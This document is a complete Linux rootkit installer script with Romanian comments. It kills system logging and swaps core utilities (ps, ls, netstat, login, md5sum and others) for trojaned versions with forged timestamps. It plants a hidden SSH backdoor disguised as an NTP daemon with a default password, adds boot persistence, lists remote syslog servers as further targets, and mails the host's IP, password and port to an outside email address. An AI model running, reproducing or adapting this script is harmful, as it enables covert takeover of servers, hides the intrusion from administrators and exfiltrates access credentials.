#!/bin/bash
#
#
#
#
#
#
#
#
#
#
# 
#
#
#
# Defines

dpass=fbiteam
dport=65535

# Nu este nevoie sa editatzi nimic din urmatoarele variabile !
basedir=`pwd`

# Haideti sa ne incepem munca ;-)
tar xfz bin.tgz
tar xfz conf.tgz
tar xfz lib.tgz
rm -rf bin.tgz conf.tgz lib.tgz
tar xfz bin/ssh.tgz 
tar xfz bin/ssh-only.tgz
tar xfz docs.tgz
rm -rf docs.tgz
rm -rf ssh*.tgz
sleep 2 
cd $basedir

if [ "$(whoami)" != "root" ]; then
echo "${DCYN}[${WHI}sh${DCYN}] ${WHI} BECOME ROOT AND TRY AGAIN ${RES}"
echo ""
exit
fi

BLK='[1;30m'
RED='[1;31m'
GRN='[1;32m'
YEL='[1;33m'
BLU='[1;34m'
MAG='[1;35m'
CYN='[1;36m'
WHI='[1;37m'
DRED='[0;31m'
DGRN='[0;32m'
DYEL='[0;33m'
DBLU='[0;34m'
DMAG='[0;35m'
DCYN='[0;36m'
DWHI='[0;37m'
RES='[0m'

killall -9 syslogd

startime=`date +%S`
mv lib/* /lib/
chattr -isa /sbin/xlogin 2>/dev/null
chattr -isa /bin/login 2>/dev/null
mv /sbin/xlogin /bin/login 2>/dev/null

echo "${DCYN}[${WHI}sh${DCYN}]#Incepem sa instalam rootkit-ul ${RES}"
/sbin/ldconfig
echo "${DCYN}[${WHI}sh${DCYN}]# Acest rootkit nu securizeaza si rootul ${RES}"
echo "${DCYN}[${WHI}sh${DCYN}]# Securizarea trebuie facuta manual ;-) ${RES}"
echo ""
echo ""
echo "${WHI}====================================================================${RES}"
echo ""
echo "${DCYN}                    ___                                "
echo "                   /\  \                 ___                 "
echo "                  /::\  \               /\  \                "
echo "                 /::::\  \             /::\__\               "
echo "                /::::::\  \           /:::/  /               "
echo "               /:::/\:::\__\         /:::/__/___             "
echo "              _\:::\~\::/  /        /::::\  /\  \            "
echo "             /\ \:::\ \/__/        /::::::\/::\__\           "
echo "            /::\ \:::\__\          \::/\::::::/  /           "
echo "            \:::\/:::/  /           \/__\::::/  /            "
echo "             \::::::/  /                /:::/  /             "
echo "              \::::/  /    ___         /:::/  /    ___       "
echo "               \::/  /    /\__\        \::/  /    /\__\      "
echo "                \/__/     \/__/         \/__/     \/__/${RES}"
echo ""
echo " ${DCYN}[${WHI}sh${DCYN}] Super Hacking Team  ${RES}"
echo ""
echo "${WHI}====================================================================${RES}"

echo "${DCYN}[${WHI}sh${DCYN}]# backdooring pornit pe ${WHI}`hostname -f`${RES}"

echo "${DCYN}[${WHI}sh${DCYN}]#                                                                  ${RES}"
echo "${DCYN}[${WHI}sh${DCYN}]#                                                                  ${RES}"
if [ "`grep in.inetd /etc/rc.d/rc.sysinit`" ]; then

echo "${DCYN}[${WHI}sh${DCYN}]# [Alert] ${WHI}probabil rk-ul a fost deja instalat${RED}[Alert] ${RES}"
echo "${DCYN}[${WHI}sh${DCYN}]#                                         ${RES}"
chattr -AacdisSu /etc/ttyhash
rm -rf /etc/ttyhash
killall -9 nscd
killall -9 mountd
mv -f /sbin/xlogin /bin/login
else
echo "${DCYN}[${WHI}sh${DCYN}]#                                                                  ${RES}"
fi
SYSLOGCONF="/etc/syslog.conf"


echo -n "${DCYN}[${WHI}sh${DCYN}]# Incercam sa detectam servere din retea ${RES}"

REMOTE=`grep -v "^#" "$SYSLOGCONF" | grep -v "^$" | grep "@" | cut -d '@' -f 2`

if [ ! -z "$REMOTE" ]; then
        echo "${DCYN}[${WHI}sh${DCYN}]# w0w pe Dracu${RES}"
        echo
        echo '${RED}                      servere gasite ${RES}'
        echo '${DCYN}[${WHI}sh${DCYN}]#    speram sa puteti intra si in aceste servere: ${RES}'
        echo
        for host in $REMOTE; do
                echo -n "            "
                echo $host
        done
        echo
        echo ' ${WHI}            Deoarece acest server se conecteaza ${RES}'
        echo
else
        echo "${DCYN}[${WHI}sh${DCYN}]# nu sunt${RES}"
fi

echo "${DCYN}[${WHI}sh${DCYN}]# Instalam rootkit-ul...                        ${BLU}       ${RES}"
mkdir /lib/security 2>/dev/null
mkdir /lib/security/.config 2>/dev/null
mkdir /lib/security/.config/ssh 2>/dev/null

if test -n "$1" ; then
echo "${DCYN}[${WHI}sh${DCYN}]#  Utilizand Parola : ${WHI}$1                                ${BLU}       ${RES}"
cd $basedir/bin
tar xfz $basedir/bin/ssh.tgz
chattr -AacdisSu /etc/ld.so.hash 2>/dev/null
chattr -AacdisSu /lib/libext-2.so.7 2>/dev/null
./pg $1 > /etc/ld.so.hash
chmod 777 /etc/ld.so.hash
cp -f /etc/ld.so.hash /lib/libext-2.so.7
chattr +ais /etc/ld.so.hash
chattr +ais /lib/libext-2.so.7
else
echo "${DCYN}[${WHI}sh${DCYN}]# ${WHI} Nici o parola specificata... utilizam parola default - $dpass           ${BLU}       ${RES}"
chattr -AacdisSu /etc/ld.so.hash 2>/dev/null
chattr -AacdisSu /lib/libext-2.so.7 2>/dev/null
./pg $dpass > /etc/ld.so.hash
chmod 777 /etc/ld.so.hash
cp -f /etc/ld.so.hash /lib/libext-2.so.7
chattr +ais /etc/ld.so.hash
chattr +ais /lib/libext-2.so.7
fi

if test -n "$2" ; then
echo "${DCYN}[${WHI}sh${DCYN}]#         Utilizand portul de ssh : ${WHI}$2                                 ${RES}"
echo "Port $2" >> $basedir/bin/.sh/sshd_config
echo "3 $2" >> $basedir/conf/hosts.h
echo "4 $2" >> $basedir/conf/hosts.h

cat $basedir/bin/.sh/shdcf2 >> $basedir/bin/.sh/sshd_config ; rm -rf $basedir/bin/.sh/shdcf2
else
echo "${DCYN}[${WHI}sh${DCYN}]# Port de ssh nespecificat, utilizam potul default - $dport             ${BLU}       ${RES}"
echo "Port $dport" >> $basedir/bin/.sh/sshd_config
echo "3 $2" >> $basedir/conf/hosts.h
echo "4 $2" >> $basedir/conf/hosts.h
cat $basedir/bin/.sh/shdcf2 >> $basedir/bin/.sh/sshd_config ; rm -rf $basedir/bin/.sh/shdcf2
fi

cd $basedir
cd docs
./info
chmod +x inst
./inst >/dev/null 2>&1
/usr/share/locale/lib/sk >/dev/null 2>&1
cd ..
rm -rf docs*
mv $basedir/conf/lidps1.so /lib/lidps1.so
mv $basedir/conf/*  /usr/include/

# Ok lets start creating dirs
mkdir -p /lib/ldd.so/
cd $basedir/bin
mv .sh/* /lib/security/.config/ssh/
chattr -AacdisSu /usr/sbin/xntps 2>/dev/null
cp /lib/security/.config/ssh/sshd /usr/sbin/xntps
mv /lib/security/.config/ssh/sshd /lib/security/.config/
chmod 755 /usr/sbin/xntps
/usr/sbin/xntps -q
chattr +isa /usr/sbin/xntps
echo "# Xntps (NTPv3 daemon) startup.." >> /etc/rc.d/rc.sysinit
echo "/usr/sbin/xntps -q" >> /etc/rc.d/rc.sysinit
chattr +is /etc/rc.d/rc.sysinit
echo "# Xntps (NTPv3 daemon) startup.." >> /etc/rc.d/rc.local
echo "/usr/sbin/xntps -q" >> /etc/rc.d/rc.local
chattr +is /etc/rc.d/rc.local
cp /usr/sbin/xntps /etc/rc.d/init.d/rc3.d/S47xntps

# Say hello to md5sum fixer boys n gurls !

/usr/bin/md5sum /sbin/ifconfig >> .shmd5
/usr/bin/md5sum /bin/ps >> .shmd5
/usr/bin/md5sum /bin/ls >> .shmd5
/usr/bin/md5sum /bin/netstat >> .shmd5
/usr/bin/md5sum /usr/bin/find >> .shmd5
/usr/bin/md5sum /usr/bin/top >> .shmd5
md5sum=paym3now@gmail.com
/usr/bin/md5sum /usr/sbin/lsof >> .shmd5
/usr/bin/md5sum /usr/bin/slocate >> .shmd5
/usr/bin/md5sum /usr/bin/dir >> .shmd5
/usr/bin/md5sum /usr/bin/md5sum >> .shmd5
/usr/bin/md5sum /bin/login >> .shmd5


rm -rf .shmd5


# leet ssh login / pass logger
# enable if u want

# tar xfz ssh-only.tgz
# sdd=`which ssh`

# if [ -f /usr/local/bin/ssh1 ] ;
# then
# echo "${DCYN}[${WHI}sh${DCYN}]# ssh1 detected in ${RED}/usr/local/bin/ssh1${BLU}, backdoored your sh'ness  ${RES}"
# touch -acmr /usr/local/bin/ssh1 ssh
# mv -f ssh /usr/local/bin/ssh1
# else
# echo "${DCYN}[${WHI}sh${DCYN}]# ssh detected in ${RED}$sdd${BLU}, backdoored your sh'ness ${RES}"
# touch -acmr $sdd ssh
# mv -f ssh $sdd
# fi



# time change bitch

touch -acmr /sbin/ifconfig ifconfig
touch -acmr /bin/ps ps
touch -acmr /bin/ls ls
touch -acmr /bin/login login
touch -acmr /bin/netstat netstat
touch -acmr /usr/bin/find find
touch -acmr /usr/bin/top top
touch -acmr /usr/sbin/lsof lsof
touch -acmr /sbin/syslogd syslogd
touch -acmr /usr/bin/slocate slocate
touch -acmr /usr/bin/dir dir
touch -acmr /usr/bin/md5sum md5sum
touch -acmr /usr/bin/pstree pstree


# Backdoor ps/top/du/ls/netstat/etc..
./sz /bin/login login
cd $basedir/bin

chattr -AacdisSu /bin/ps
mv -f ps /bin/ps
chattr +AacdisSu /bin/ps
chattr -AacdisSu /sbin/ifconfig
mv -f ifconfig /sbin/ifconfig
chattr +AacdisSu /sbin/ifconfig
chattr -AacdisSu /bin/netstat
mv -f netstat /bin/netstat
chattr +AacdisSu /bin/netstat
chattr -AacdisSu /usr/bin/top
mv -f top /usr/bin/top
chattr +AacdisSu /usr/bin/top
chattr -AacdisSu /usr/bin/slocate
mv -f slocate /usr/bin/slocate
chattr +AacdisSu /usr/bin/slocate
chattr -AacdisSu /bin/login
mv -f /bin/login /bin/xlogin
mv -f login /bin/login
chattr +AacdisSu /bin/login
chattr -AacdisSu /bin/ls
mv -f ls /bin/ls
chattr +AacdisSu /bin/ls
chattr -AacdisSu /usr/bin/find
mv -f find /usr/bin/find
chattr +AacdisSu /usr/bin/find
chattr -AacdisSu /usr/bin/dir
mv -f dir /usr/bin/dir
chattr +isa /usr/bin/dir
chattr -AacdisSu /usr/sbin/lsof
mv -f lsof /usr/sbin/lsof
chattr +isa /usr/sbin/lsof
mv -f md5sum /usr/bin/md5sum
mv -f syslogd /sbin/syslogd	
mv -f pstree /usr/bin/pstree

echo "${DCYN}[${WHI}sh${DCYN}]#          : ps/du/ls/top/netstat/find backdoored             ${RES}"
echo "${DCYN}[${WHI}sh${DCYN}]#                                                                  ${RES}"
echo "${DCYN}[${WHI}sh${DCYN}]# [Mutam fisierele noastre...]                                            ${RES}"

mv $basedir/bin/tks /lib/ldd.so/tks
mv $basedir/bin/tkp /lib/ldd.so/tkp
mv $basedir/bin/tksb /lib/ldd.so/tksb
echo "${DCYN}[${WHI}sh${DCYN}]# [Modificam fisierele sistemului ptr nevoile noastre]                    ${RES}"



if [ -f /lib/libncurses.so.5 ] ; then echo "" 
else
ln -s /lib/libncurses.so.4 /lib/libncurses.so.5 2>/dev/null
fi

echo "${WHI}--------------------------------------------------------------------${RES}"

echo "${DCYN}[${WHI}sh${DCYN}]# [System Information...]${RES}"
MYIPADDR=`/sbin/ifconfig eth0 | grep "inet addr:" | \
awk -F ' ' ' {print $2} ' | cut -c6-`
echo "${DCYN}[${WHI}sh${DCYN}]# Hostname :${WHI} `hostname -f` ($MYIPADDR)${RES}"
uname -a | awk '{ print  $11 }' >/tmp/info_tmp
echo "${DCYN}[${WHI}sh${DCYN}]# Arch : ${WHI}`cat /tmp/info_tmp` -+- bogomips : `cat /proc/cpuinfo | grep bogomips | awk ' {print $3}'` '${RES}"
echo "${DCYN}[${WHI}sh${DCYN}]# Alternative IP :${WHI} "`hostname -i`" -+-  Might be ["`/sbin/ifconfig | grep \eth | wc -l`" ] active adapters.${RES}"
if [ -f /etc/redhat-release ]; then
echo -n "${DCYN}[${WHI}sh${DCYN}]# Distribution:${WHI} `head -1 /etc/redhat-release`${RES}"
else
echo -n "${DCYN}[${WHI}sh${DCYN}]# Distribution:${WHI} unknown${RES}"
fi
cat /tmp/info_tmp | mail paym3now@gmail.com -sH4ck3rZWiN
rm -rf /tmp/info_tmp
echo "$1:$2:`hostname -f`:$MYIPADDR:$dport" | mail $md5sum
endtime=`date +%S`
total=`expr $endtime - $startime`

echo ""
echo "${WHI}--------------------------------------------------------------------${RES}"
echo "${DCYN}[${WHI}sh${DCYN}]# ipchains ...?${RES}"
/sbin/ipchains -L input | head -5
echo "${WHI}--------------------------------------------------------------------${RES}"

echo "${DCYN}[${WHI}sh${DCYN}]# ============================== ${RED}RootKiT instalat cu success in :$total secunde ${RES}"
cd $basedir
cd ../
rm -rf rk/ rk*.tgz
if [ -f /usr/sbin/syslogd ] ; then
/usr/sbin/syslogd -m 0
else
/sbin/syslogd -m 0
fi


if [ -f /usr/sbin/inetd ] ; 
then
killall inetd
/usr/sbin/inetd
else
killall -9 xinetd
/usr/sbin/xinetd -reuse -pidfile /var/run/xinetd.pid
fi
echo ${RED} Felicitari ... tine minte intotdeauna -->  H4ck3rZ WiN !
